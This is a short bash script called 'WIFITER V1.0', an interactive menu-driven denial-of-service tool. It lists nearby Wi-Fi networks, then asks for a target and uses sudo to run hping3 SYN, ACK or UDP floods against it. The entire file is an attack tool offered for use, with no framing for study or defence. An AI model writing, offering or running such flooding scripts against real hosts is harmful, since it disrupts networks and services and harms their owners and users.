#!/bin/bash

#START

#colours defined used 
#color variables
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' 		#Biru
RESET="\033[00m" 		#normal
orange='\e[38;5;166m'

sleep 3


clear && echo ""
echo " "
echo $red
echo " "
echo " ddddddd     dddddddd      oo00000000        ssssss        "
echo " dd     d    dd       d    oo      00      ss              "
echo " dd      d   dd        d   oo      00      ss              "
echo " dd       d  dd         d  oo      00       sss            "
echo " dd       d  dd         d  oo      00           ss         "
echo " dd      d   dd        d   oo      00             ss       "
echo " dd     d    dd       d    oo      oo            ss        "
echo " ddddddd     ddddddddd     oooooooooo      ssssss          "

sleep 2

#emoji of wireless tower
echo $BlueF ""
echo "( (  O  ) )"
echo "    / \    "
echo "   /   \   "

sleep 3

#title and created by
echo $lightgreen
echo " WIFITER V1.0  "
echo "             by _snaqvi"

sleep 2

#scanning for wifi
echo $yellow
echo "Checking for WiFi Connections."

sleep 2

echo "Available Wifi Networks."
echo $RESET
nmcli dev wifi


#mainmenu of DOS
MainMenu(){
	
	echo  $orange
	
	echo "Options Available"
	echo "1. DOS Attack"
	echo "2. Quit"

	echo $green
	read -p "Enter Option: " opt

	if [ "$opt" = "2" ]; then
		echo $red
		echo "Quitting... Thankyou for Using." && sleep 1 && clear
		exit 0
	
	elif [ "$opt" = "1" ]; then
		DOS
	
	else 
		echo "Not a valid Option! Hit Return to show Mainmenu!"
	fi	
}


#main function
#body of DOS
DOS(){
	echo $orange
	
	echo "Options Available in DOS Attack."
	echo "1. TCP SYN Flood"
	echo "2. TCP ACK Flood"
	echo "3. UDP Flood"
	echo "4. Quit"

	echo $RESET
	
	read -p "Enter Option: " opt
	if [ "$opt" = "1" ]; then
		synflood
	
	elif [ "$opt" = "2" ]; then
		ackflood
	
	elif [ "$opt" = "3" ]; then
		udpflood
	
	elif [ "$opt" = "4" ]; then
		echo $red

		echo "Quitting... Thankyou for Using." && sleep 1 && clear
		exit 0
	fi
}

#tcp syn flooding attack
synflood(){

	echo $cyan
	echo "TCP SYN Flood using hping3... Checking for hping3..."
	
	if test -f "/usr/sbin/hping3"; then 
		echo "hping3 found, Continuing Attacking!"
		
		TARGET=""
		DATA=""

		read -p "Enter Target: " TARGET
		: ${DATA:=5000}
		echo "Size of Pakcet: " $DATA "bytes"

		#tcp syn attack
			sudo hping3 -d $DATA -S $TARGET 
	fi
}


#tcp ack flooding attack
ackflood(){

	echo $okegreen

	echo "TCP ACK Flood using hping3... Checking for hping3..."
	if test -f "/usr/sbin/hping3"; then 
		echo "hping3 found, Continuing Attacking!"

		TARGET=""
		DATA=""

		read -p "Enter Target: " TARGET
		: ${DATA:=5000}
		echo "Size of Packet: " $DATA "bytes"
		
		#ack attack
		sudo hping3 -d $DATA -A $TARGET
	fi
}


#udp flood attack
udpflood(){

	echo $green
	echo "UDP Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then 
		echo "hping3 found, continuing!";

		TARGET=""
		DATA=""

		read -p "Enter Target: " TARGET
		read -p "Enter random string (data to send): " DATA

		sudo hping3 --udp --sign $DATA -S $TARGET
	fi

}

#mainmenu 
#function called
#all the things happen from here
MainMenu

#END
